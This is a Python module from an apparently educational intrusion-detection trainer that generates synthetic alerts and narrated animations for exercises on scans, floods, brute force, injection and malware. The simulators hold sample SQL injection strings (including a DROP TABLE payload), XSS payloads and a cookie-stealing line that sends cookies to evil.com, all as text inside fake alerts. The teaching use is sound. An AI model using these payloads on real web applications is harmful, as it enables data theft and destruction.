
#Generates fake attack alerts + animation data for each exercise.


import random
from datetime import datetime, timedelta

from app.db import get_db



# Each exercise has its own custom script below.

VISUAL_SCRIPTS = {
    "port_scan": {
        "attacker": {"ip": "203.0.113.42", "label": "Attacker"},
        "target": {"ip": "192.168.1.10", "label": "Target Server"},
        "narration": [
            "📡 An attacker (203.0.113.42) starts probing your server...",
            "🔍 Trying port 22 (SSH)... 80 (HTTP)... 443 (HTTPS)...",
            "🔍 Now hitting database ports (3306, 5432) and admin ports (3389)...",
            "⚠️ The IDS notices: one IP is touching 20+ different ports in 30 seconds!",
            "🚨 Heuristic rule triggered: 'Port Scan Detected'",
            "✅ Alert raised. The attacker's reconnaissance has been spotted.",
        ],
        # 12 time-based packet bursts representing the scan
        "packet_bursts": [
            {"time": 0.0, "count": 3, "color": "#eab308"},
            {"time": 0.5, "count": 4, "color": "#eab308"},
            {"time": 1.0, "count": 5, "color": "#eab308"},
            {"time": 1.5, "count": 6, "color": "#f97316"},
            {"time": 2.0, "count": 6, "color": "#f97316"},
            {"time": 2.5, "count": 5, "color": "#f97316"},
            {"time": 3.0, "count": 4, "color": "#ef4444"},  
        ],
        "detection_time": 2.5, # Detection
    },
    "dos_attack": {
        "attacker": {"ip": "198.51.100.17", "label": "Attacker"},
        "target": {"ip": "192.168.1.10", "label": "Web Server"},
        "narration": [
            "💀 A DoS attack begins from 198.51.100.17...",
            "🌊 The attacker floods port 80 with thousands of packets per second.",
            "🌊 Packet rate climbs: 200/sec... 500/sec... 1000/sec...",
            "📉 The web server is becoming unresponsive — response times are spiking.",
            "⚠️ The IDS detects: packet rate is 15x above the learned baseline!",
            "🚨 Heuristic + ML alerts triggered simultaneously.",
            "✅ Source IP can now be blocked at the firewall to stop the flood.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 5, "color": "#eab308"},
            {"time": 0.4, "count": 10, "color": "#eab308"},
            {"time": 0.8, "count": 18, "color": "#f97316"},
            {"time": 1.2, "count": 25, "color": "#f97316"},
            {"time": 1.6, "count": 30, "color": "#ef4444"},
            {"time": 2.0, "count": 35, "color": "#ef4444"},
            {"time": 2.4, "count": 38, "color": "#ef4444"},
            {"time": 2.8, "count": 40, "color": "#ef4444"},
        ],
        "detection_time": 1.6,
    },
    "brute_force": {
        "attacker": {"ip": "10.0.0.55", "label": "Attacker"},
        "target": {"ip": "192.168.1.10", "label": "SSH Server"},
        "narration": [
            "🔓 Attacker tries to log in via SSH (port 22)...",
            "🔁 Trying username 'root' with password 'admin123'... FAILED",
            "🔁 Trying 'root' / 'password'... FAILED",
            "🔁 Trying 'admin' / 'letmein'... FAILED",
            "🔁 Repeated failed attempts — 50+ in under a minute.",
            "⚠️ IDS notices: too many SYN packets to port 22 from one IP.",
            "🚨 Brute force alert raised. Account lockout recommended.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 2, "color": "#eab308"},
            {"time": 0.5, "count": 3, "color": "#eab308"},
            {"time": 1.0, "count": 4, "color": "#eab308"},
            {"time": 1.5, "count": 5, "color": "#f97316"},
            {"time": 2.0, "count": 6, "color": "#f97316"},
            {"time": 2.5, "count": 7, "color": "#ef4444"},
            {"time": 3.0, "count": 8, "color": "#ef4444"},
        ],
        "detection_time": 2.0,
    },
    "sql_injection": {
        "attacker": {"ip": "172.16.0.99", "label": "Attacker"},
        "target": {"ip": "192.168.1.10", "label": "Web App"},
        "narration": [
            "🌐 An attacker sends a normal-looking HTTP request to the website...",
            "💉 But the URL contains: ?id=1' OR 1=1 --",
            "💉 Next request tries: UNION SELECT username, password FROM users",
            "💉 Another tries: '; DROP TABLE users; --",
            "🔍 IDS scans every HTTP payload against SQL injection patterns...",
            "⚠️ Match found! These payloads contain known SQLi signatures.",
            "🚨 Signature-based alert raised for each malicious request.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 1, "color": "#06b6d4"},
            {"time": 1.0, "count": 1, "color": "#ef4444"},
            {"time": 2.0, "count": 1, "color": "#ef4444"},
            {"time": 3.0, "count": 1, "color": "#ef4444"},
        ],
        "detection_time": 1.0,
    },
    "xss_attack": {
        "attacker": {"ip": "10.0.0.77", "label": "Attacker"},
        "target": {"ip": "192.168.1.10", "label": "Web App"},
        "narration": [
            "🌐 Attacker posts a comment on a website...",
            "💉 But the comment contains: <script>alert('XSS')</script>",
            "💉 Next attempt: <img src=x onerror=alert(document.cookie)>",
            "💉 Trying to steal cookies via injected JavaScript",
            "🔍 IDS inspects every HTTP POST for script injection patterns...",
            "⚠️ Match! Script tags detected in user-submitted content.",
            "🚨 XSS signature alert raised.",
        ],
        "packet_bursts": [
            {"time": 0.5, "count": 1, "color": "#ef4444"},
            {"time": 1.5, "count": 1, "color": "#ef4444"},
            {"time": 2.5, "count": 1, "color": "#ef4444"},
        ],
        "detection_time": 0.5,
    },
    "weak_passwords": {
        "attacker": {"ip": "192.168.1.50", "label": "Audit Tool"},
        "target": {"ip": "192.168.1.10", "label": "User DB"},
        "narration": [
            "🔍 Security audit scans the user database...",
            "📋 Found 1,247 user accounts.",
            "⚠️ 3 accounts are using passwords from the top-100 most common list.",
            "⚠️ Weak passwords found: '123456', 'password', 'qwerty'...",
            "📊 These passwords can be cracked in milliseconds.",
            "🚨 Policy violation alert: weak passwords detected.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 2, "color": "#eab308"},
            {"time": 1.0, "count": 3, "color": "#eab308"},
            {"time": 2.0, "count": 2, "color": "#f97316"},
        ],
        "detection_time": 1.5,
    },
    "credential_stuffing": {
        "attacker": {"ip": "198.51.100.33", "label": "Bot Network"},
        "target": {"ip": "192.168.1.10", "label": "Login Page"},
        "narration": [
            "🤖 An automated bot starts trying leaked credentials...",
            "🔁 Trying email1@example.com with 'Password123'",
            "🔁 Trying email2@example.com with 'qwerty2024'",
            "🔁 200+ login attempts in 2 minutes from one IP.",
            "⏱️ Requests arrive exactly every 0.3 seconds — too consistent for a human.",
            "⚠️ ML model spots the unusual timing pattern.",
            "🚨 Credential stuffing alert raised.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 3, "color": "#eab308"},
            {"time": 0.5, "count": 5, "color": "#eab308"},
            {"time": 1.0, "count": 8, "color": "#f97316"},
            {"time": 1.5, "count": 10, "color": "#f97316"},
            {"time": 2.0, "count": 12, "color": "#ef4444"},
            {"time": 2.5, "count": 14, "color": "#ef4444"},
        ],
        "detection_time": 1.5,
    },
    "password_hashing": {
        "attacker": {"ip": "172.16.0.55", "label": "Attacker"},
        "target": {"ip": "192.168.1.10", "label": "Database"},
        "narration": [
            "🎯 Attacker has gained access to the web server...",
            "💾 They attempt to query the database for password hashes",
            "📊 SQL detected: SELECT username, password_hash FROM users",
            "⚠️ Unusually large outbound transfer: 45MB to attacker IP",
            "📈 ML model: this transfer is 50x larger than normal queries.",
            "🚨 Database exfiltration alert! Hash database may be stolen.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 1, "color": "#06b6d4"},
            {"time": 1.0, "count": 3, "color": "#eab308"},
            {"time": 2.0, "count": 8, "color": "#f97316"},
            {"time": 3.0, "count": 12, "color": "#ef4444"},
        ],
        "detection_time": 2.0,
    },
    "viruses": {
        "attacker": {"ip": "192.168.1.25", "label": "Infected PC"},
        "target": {"ip": "Internal", "label": "Other Hosts"},
        "narration": [
            "🦠 An infected machine (192.168.1.25) starts spreading...",
            "📡 Sending SMB packets (port 445) to other PCs on the network",
            "📡 Trying 192.168.1.1, .2, .3, .4, .5...",
            "🌐 Also reaching out to external IP — suspected C2 server",
            "🔍 IDS recognises the WannaCry-like spreading pattern",
            "⚠️ ML model: this PC now contacts 20 hosts (normally 2-3)",
            "🚨 Worm propagation detected! Isolating the infected machine.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 2, "color": "#eab308"},
            {"time": 0.5, "count": 4, "color": "#eab308"},
            {"time": 1.0, "count": 6, "color": "#f97316"},
            {"time": 1.5, "count": 10, "color": "#f97316"},
            {"time": 2.0, "count": 14, "color": "#ef4444"},
            {"time": 2.5, "count": 18, "color": "#ef4444"},
        ],
        "detection_time": 1.5,
    },
    "ransomware": {
        "attacker": {"ip": "192.168.1.30", "label": "Infected PC"},
        "target": {"ip": "192.168.1.5", "label": "File Server"},
        "narration": [
            "🦠 Ransomware activates on an infected PC (192.168.1.30)...",
            "🔐 It starts encrypting files on the network share at 500x normal rate",
            "📁 File extensions are changing to .encrypted",
            "🌐 The malware contacts a C2 server to retrieve the encryption key",
            "📡 Then attempts to spread to other network shares (lateral movement)",
            "⚠️ ML model: file access pattern matches ransomware behaviour",
            "🚨 Critical alert! Disconnect the infected machine immediately.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 1, "color": "#06b6d4"},
            {"time": 0.5, "count": 5, "color": "#eab308"},
            {"time": 1.0, "count": 10, "color": "#f97316"},
            {"time": 1.5, "count": 18, "color": "#ef4444"},
            {"time": 2.0, "count": 25, "color": "#ef4444"},
            {"time": 2.5, "count": 30, "color": "#ef4444"},
        ],
        "detection_time": 1.5,
    },
    "trojans": {
        "attacker": {"ip": "192.168.1.40", "label": "Infected PC"},
        "target": {"ip": "203.0.113.77", "label": "C2 Server"},
        "narration": [
            "🐴 A trojan is hiding on an employee's computer (192.168.1.40)...",
            "📡 It beacons out to a command server every 30 seconds",
            "📡 Using port 8443 to look like normal HTTPS traffic",
            "📊 The beacon interval is too regular — humans don't browse like this",
            "⚠️ ML model: 12MB exfiltrated when machine normally sends <100KB/hour",
            "🚨 Trojan C2 communication detected. The PC is calling home.",
        ],
        "packet_bursts": [
            {"time": 0.0, "count": 1, "color": "#eab308"},
            {"time": 0.5, "count": 1, "color": "#eab308"},
            {"time": 1.0, "count": 1, "color": "#f97316"},
            {"time": 1.5, "count": 1, "color": "#f97316"},
            {"time": 2.0, "count": 4, "color": "#ef4444"},
            {"time": 2.5, "count": 6, "color": "#ef4444"},
        ],
        "detection_time": 1.5,
    },
}


def get_visual_script(exercise_id):
    """Return the visualisation script for an exercise (for the animated diagram)."""
    return VISUAL_SCRIPTS.get(exercise_id, {
        "attacker": {"ip": "unknown", "label": "Attacker"},
        "target": {"ip": "unknown", "label": "Target"},
        "narration": ["Running simulation..."],
        "packet_bursts": [{"time": 0.0, "count": 5, "color": "#eab308"}],
        "detection_time": 1.0,
    })


def run_simulation(user_id, exercise_id):
    """
    Run a simulation for the given exercise.
    Generates synthetic alerts and stores them in the database.
    Returns the list of alerts that were created.
    """
    # Clear any previous alerts for this user
    conn = get_db()
    conn.execute(
        "DELETE FROM alerts WHERE user_id = ? AND exercise_id = ?",
        (user_id, exercise_id)
    )
    conn.commit()

    # Pick the right simulation based on exercise type
    simulators = {
        "port_scan": simulate_port_scan,
        "dos_attack": simulate_dos,
        "brute_force": simulate_brute_force,
        "sql_injection": simulate_sqli,
        "xss_attack": simulate_xss,
        "weak_passwords": simulate_weak_passwords,
        "credential_stuffing": simulate_credential_stuffing,
        "password_hashing": simulate_password_hashing,
        "viruses": simulate_virus,
        "ransomware": simulate_ransomware,
        "trojans": simulate_trojan,
    }

    simulator_func = simulators.get(exercise_id)
    if not simulator_func:
        return []

    alerts = simulator_func()

    # Save all alerts to the database
    for alert in alerts:
        conn.execute(
            """INSERT INTO alerts
               (user_id, exercise_id, detected_at, src_ip, dst_ip,
                src_port, dst_port, alert_type, severity, description,
                detection_method)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                user_id,
                exercise_id,
                alert["detected_at"],
                alert.get("src_ip"),
                alert.get("dst_ip"),
                alert.get("src_port"),
                alert.get("dst_port"),
                alert["alert_type"],
                alert["severity"],
                alert["description"],
                alert["detection_method"],
            )
        )
    conn.commit()
    conn.close()

    return alerts


def run_simulation_with_visuals(user_id, exercise_id):
    """Run simulation and return both alerts and visualisation data."""
    alerts = run_simulation(user_id, exercise_id)
    return {
        "alerts": alerts,
        "visual": get_visual_script(exercise_id),
    }


def _random_time(minutes_ago=5):
    """Generate a random timestamp within the last N minutes."""
    offset = random.randint(0, minutes_ago * 60)
    return (datetime.utcnow() - timedelta(seconds=offset)).strftime("%Y-%m-%d %H:%M:%S")


#network attack simulators

def simulate_port_scan():
    """Simulate a port scan: one attacker hitting many ports."""
    attacker = "203.0.113.42"
    target = "192.168.1.10"
    scanned_ports = random.sample(range(1, 1024), 25)

    alerts = []

    # The IDS detects the scan pattern
    alerts.append({
        "detected_at": _random_time(2),
        "src_ip": attacker,
        "dst_ip": target,
        "src_port": random.randint(49152, 65535),
        "dst_port": None,
        "alert_type": "Port Scan Detected",
        "severity": 3,
        "description": (
            f"Heuristic detection: {len(scanned_ports)} unique destination ports "
            f"contacted by {attacker} in 30 seconds. "
            f"Ports scanned include: {', '.join(str(p) for p in sorted(scanned_ports)[:10])}..."
        ),
        "detection_method": "heuristic",
    })

    # Individual port hits on interesting services
    service_ports = {22: "SSH", 80: "HTTP", 443: "HTTPS", 3306: "MySQL", 3389: "RDP"}
    for port, service in service_ports.items():
        if port in scanned_ports:
            alerts.append({
                "detected_at": _random_time(2),
                "src_ip": attacker,
                "dst_ip": target,
                "src_port": random.randint(49152, 65535),
                "dst_port": port,
                "alert_type": f"Port Probe: {service} ({port})",
                "severity": 2,
                "description": f"SYN packet sent to {target}:{port} ({service}) from {attacker}. Service appears open.",
                "detection_method": "heuristic",
            })

    return alerts


def simulate_dos():
    """Simulate a DoS flood."""
    attacker = "198.51.100.17"
    target = "192.168.1.10"
    packet_count = random.randint(800, 1500)

    return [
        {
            "detected_at": _random_time(1),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": None,
            "dst_port": 80,
            "alert_type": "DoS Attack: SYN Flood",
            "severity": 5,
            "description": (
                f"Heuristic detection: {packet_count} packets from {attacker} in the last "
                f"60 seconds (threshold: 200/min). Target port: 80 (HTTP). "
                f"This is {packet_count // 200}x the normal threshold."
            ),
            "detection_method": "heuristic",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": None,
            "dst_port": 80,
            "alert_type": "ML Anomaly: Abnormal Packet Rate",
            "severity": 4,
            "description": (
                f"ML detection: Traffic from {attacker} has an anomaly score of -0.82 "
                f"(confidence: 91%). The packet_rate feature is 15x higher than the learned "
                f"baseline. This pattern doesn't match any normal traffic profile."
            ),
            "detection_method": "ml",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": None,
            "dst_port": 80,
            "alert_type": "Service Degradation Warning",
            "severity": 4,
            "description": (
                f"Response time on {target}:80 has increased from 50ms to 2300ms. "
                f"This correlates with the flood traffic from {attacker}."
            ),
            "detection_method": "heuristic",
        },
    ]


def simulate_brute_force():
    """Simulate an SSH brute force attack."""
    attacker = "10.0.0.55"
    target = "192.168.1.10"
    attempts = random.randint(50, 150)

    usernames = ["root", "admin", "ubuntu", "user", "test", "postgres", "deploy"]

    return [
        {
            "detected_at": _random_time(3),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 22,
            "alert_type": "Brute Force: SSH Login Attempts",
            "severity": 4,
            "description": (
                f"Heuristic detection: {attempts} SYN packets to {target}:22 (SSH) from "
                f"{attacker} in 60 seconds (threshold: 15). Attempted usernames include: "
                f"{', '.join(random.sample(usernames, 4))}."
            ),
            "detection_method": "heuristic",
        },
        {
            "detected_at": _random_time(2),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 22,
            "alert_type": "ML Anomaly: Repeated Auth Connections",
            "severity": 4,
            "description": (
                f"ML detection: The syn_ratio feature for {attacker} is 0.95 (normally ~0.1). "
                f"Combined with high packet_rate to a single auth port, this strongly suggests "
                f"automated brute force activity."
            ),
            "detection_method": "ml",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 22,
            "alert_type": "Failed Auth: Rate Limit Exceeded",
            "severity": 3,
            "description": f"More than {attempts} failed SSH login attempts from {attacker}. Account lockout recommended.",
            "detection_method": "heuristic",
        },
    ]


# injection attack simulators

def simulate_sqli():
    """Simulate SQL injection attempts."""
    attacker = "172.16.0.99"
    target = "192.168.1.10"

    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --",
        "' OR sleep(5) --",
    ]

    alerts = []
    for payload in payloads:
        alerts.append({
            "detected_at": _random_time(3),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 80,
            "alert_type": "Signature: SQL Injection Attempt",
            "severity": 5,
            "description": (
                f"Signature match in HTTP payload from {attacker}. "
                f"Matched pattern: \"{payload}\". "
                f"This payload attempts to manipulate the database query."
            ),
            "detection_method": "signature",
        })

    return alerts


def simulate_xss():
    """Simulate XSS attempts."""
    attacker = "10.0.0.77"
    target = "192.168.1.10"

    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:document.location='http://evil.com/steal?c='+document.cookie",
    ]

    alerts = []
    for payload in payloads:
        alerts.append({
            "detected_at": _random_time(2),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 80,
            "alert_type": "Signature: XSS Attempt",
            "severity": 4,
            "description": (
                f"Signature match in HTTP payload from {attacker}. "
                f"Detected script injection attempt. "
                f"This payload tries to execute JavaScript in other users' browsers."
            ),
            "detection_method": "signature",
        })

    return alerts


#password / credential simulators

def simulate_weak_passwords():
    """Simulate detection of weak password usage patterns."""
    target = "192.168.1.10"

    weak_passwords = ["123456", "password", "admin", "qwerty", "letmein"]

    return [
        {
            "detected_at": _random_time(2),
            "src_ip": "192.168.1.50",
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 443,
            "alert_type": "Weak Password Detected",
            "severity": 3,
            "description": (
                f"Password audit found accounts using commonly breached passwords. "
                f"Passwords matching the top-100 most common list were detected. "
                f"Examples of weak patterns: {', '.join(weak_passwords)}."
            ),
            "detection_method": "signature",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": "192.168.1.50",
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 443,
            "alert_type": "Password Policy Violation",
            "severity": 2,
            "description": "3 accounts found with passwords shorter than 8 characters and no special characters.",
            "detection_method": "heuristic",
        },
    ]


def simulate_credential_stuffing():
    """Simulate a credential stuffing attack."""
    attacker = "198.51.100.33"
    target = "192.168.1.10"
    attempts = random.randint(200, 500)

    return [
        {
            "detected_at": _random_time(3),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 443,
            "alert_type": "Credential Stuffing Detected",
            "severity": 5,
            "description": (
                f"Heuristic detection: {attempts} login attempts from {attacker} using "
                f"{attempts} different usernames in 120 seconds. This pattern matches "
                f"automated credential stuffing — testing leaked username/password pairs."
            ),
            "detection_method": "heuristic",
        },
        {
            "detected_at": _random_time(2),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 443,
            "alert_type": "ML Anomaly: Login Pattern",
            "severity": 4,
            "description": (
                f"ML detection: Login requests from {attacker} arrive at exactly 0.3s intervals — "
                f"too consistent for human typing. Automated tool suspected."
            ),
            "detection_method": "ml",
        },
    ]


def simulate_password_hashing():
    """Simulate detection of weak hashing being exploited."""
    attacker = "172.16.0.55"
    target = "192.168.1.10"

    return [
        {
            "detected_at": _random_time(2),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 3306,
            "alert_type": "Signature: Database Exfiltration Attempt",
            "severity": 5,
            "description": (
                f"Signature match: SQL query 'SELECT username, password_hash FROM users' "
                f"detected from {attacker}. Attacker may be trying to extract password "
                f"hashes for offline cracking."
            ),
            "detection_method": "signature",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": attacker,
            "dst_ip": target,
            "src_port": random.randint(49152, 65535),
            "dst_port": 3306,
            "alert_type": "Large Data Transfer from Database",
            "severity": 4,
            "description": (
                f"ML detection: Unusually large outbound data transfer (45MB) from database "
                f"server to {attacker}. Normal queries transfer <1MB. Possible hash database "
                f"exfiltration."
            ),
            "detection_method": "ml",
        },
    ]


# malware simulators

def simulate_virus():
    """Simulate virus/worm network activity."""
    infected = "192.168.1.25"

    targets = [f"192.168.1.{i}" for i in range(1, 20)]

    return [
        {
            "detected_at": _random_time(3),
            "src_ip": infected,
            "dst_ip": "multiple",
            "src_port": random.randint(49152, 65535),
            "dst_port": 445,
            "alert_type": "Worm Propagation Detected",
            "severity": 5,
            "description": (
                f"Heuristic detection: {infected} is sending SMB packets (port 445) to "
                f"{len(targets)} internal IPs in rapid succession. This is characteristic "
                f"of worm propagation — an infected machine trying to spread."
            ),
            "detection_method": "heuristic",
        },
        {
            "detected_at": _random_time(2),
            "src_ip": infected,
            "dst_ip": "203.0.113.100",
            "src_port": random.randint(49152, 65535),
            "dst_port": 443,
            "alert_type": "Signature: Known Malware C2 Communication",
            "severity": 5,
            "description": (
                f"Signature match: Outbound connection from {infected} to known "
                f"command-and-control server 203.0.113.100. Matched malware family: "
                f"WannaCry variant signature."
            ),
            "detection_method": "signature",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": infected,
            "dst_ip": "multiple",
            "src_port": None,
            "dst_port": 445,
            "alert_type": "ML Anomaly: Unusual Internal Scanning",
            "severity": 4,
            "description": (
                f"ML detection: {infected} normally communicates with 2-3 internal hosts. "
                f"It is now contacting {len(targets)} hosts on port 445. Anomaly score: -0.91, "
                f"confidence: 94%."
            ),
            "detection_method": "ml",
        },
    ]


def simulate_ransomware():
    """Simulate ransomware activity."""
    infected = "192.168.1.30"

    return [
        {
            "detected_at": _random_time(3),
            "src_ip": infected,
            "dst_ip": "192.168.1.5",
            "src_port": random.randint(49152, 65535),
            "dst_port": 445,
            "alert_type": "Ransomware: Rapid File Encryption",
            "severity": 5,
            "description": (
                f"ML detection: {infected} is accessing files on the network share at 500x "
                f"the normal rate. File extensions are being changed to .encrypted. "
                f"This matches ransomware file encryption behaviour."
            ),
            "detection_method": "ml",
        },
        {
            "detected_at": _random_time(2),
            "src_ip": infected,
            "dst_ip": "198.51.100.200",
            "src_port": random.randint(49152, 65535),
            "dst_port": 443,
            "alert_type": "Signature: Ransomware C2 Beacon",
            "severity": 5,
            "description": (
                f"Signature match: {infected} is making HTTPS connections to a known "
                f"ransomware command-and-control server. The encryption key is likely "
                f"being retrieved from this server."
            ),
            "detection_method": "signature",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": infected,
            "dst_ip": "192.168.1.5",
            "src_port": None,
            "dst_port": 445,
            "alert_type": "Lateral Movement Detected",
            "severity": 4,
            "description": (
                f"Heuristic detection: {infected} is attempting to connect to network shares "
                f"it has never accessed before. This suggests the ransomware is trying to "
                f"spread to other machines on the network."
            ),
            "detection_method": "heuristic",
        },
    ]


def simulate_trojan():
    """Simulate Trojan horse activity."""
    infected = "192.168.1.40"
    c2_server = "203.0.113.77"

    return [
        {
            "detected_at": _random_time(3),
            "src_ip": infected,
            "dst_ip": c2_server,
            "src_port": random.randint(49152, 65535),
            "dst_port": 8443,
            "alert_type": "Trojan: C2 Communication on Non-Standard Port",
            "severity": 5,
            "description": (
                f"Heuristic detection: {infected} is making regular HTTPS-like connections "
                f"to {c2_server}:8443 every 30 seconds. This beaconing pattern is typical "
                f"of Trojan command-and-control communication."
            ),
            "detection_method": "heuristic",
        },
        {
            "detected_at": _random_time(2),
            "src_ip": infected,
            "dst_ip": c2_server,
            "src_port": random.randint(49152, 65535),
            "dst_port": 8443,
            "alert_type": "Signature: Emotet Trojan Beacon",
            "severity": 5,
            "description": (
                f"Signature match: Traffic from {infected} matches the Emotet Trojan "
                f"communication protocol. Encrypted payload structure and beacon interval "
                f"match known Emotet variants."
            ),
            "detection_method": "signature",
        },
        {
            "detected_at": _random_time(1),
            "src_ip": infected,
            "dst_ip": c2_server,
            "src_port": random.randint(49152, 65535),
            "dst_port": 443,
            "alert_type": "Data Exfiltration Suspected",
            "severity": 4,
            "description": (
                f"ML detection: {infected} has sent 12MB of data to {c2_server} in the "
                f"last 5 minutes. This machine normally sends <100KB outbound per hour. "
                f"Possible keylogger or data-stealing Trojan exfiltrating collected data."
            ),
            "detection_method": "ml",
        },
    ]
